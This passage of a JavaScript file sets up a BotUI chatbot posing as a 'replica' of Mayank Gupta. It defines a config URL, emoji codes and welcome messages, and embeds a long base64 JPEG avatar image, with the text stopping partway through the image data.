/**
 * Hello, I am Mayank Gupta Replica, I represent Same as Mayank Gupta, So ask Wahtever you want to ask like you would ask to Mayank. 
 * 
 */


 let config_url = "https://imayank.me/chatApp/";

 //Initialize BotUI
 var loadIndex,
 botui = new BotUI('mayank-brain-replica');


 //Smiley codes
 let smiley_codes = {
  "GRINNING_FACE" : "&#128512",
  "GRINNING_FACE_WITH_SMILING_EYES" : '&#128513'
}



 //Trigger Welcome message on screen when user lands
 botui.message.add({
    content: "Hello Stranger, What's up?"
 })
 botui.message.add({
   type:"html",
    content:'<div class="bot-image"><img src="data:image/jpg;base64,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